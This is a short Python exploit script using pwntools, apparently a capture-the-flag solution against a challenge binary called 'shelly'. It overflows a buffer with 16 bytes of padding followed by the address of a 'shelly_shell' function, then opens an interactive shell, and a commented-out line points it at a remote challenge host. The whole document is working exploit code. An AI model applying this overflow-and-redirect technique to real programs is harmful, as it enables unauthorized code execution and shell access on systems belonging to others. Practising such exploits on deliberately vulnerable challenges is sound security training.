from pwn import *

elf = ELF("./source/shelly")

r = process("./source/shelly")
#r = remote("shelly.heltsikker.no", 9002)

backdoor = p32(elf.symbols["shelly_shell"]) #p32(0x08049216)
padding = b"A"*16

log.success("Popping shell!")

r.sendline(padding+backdoor)
r.recv()
r.interactive()

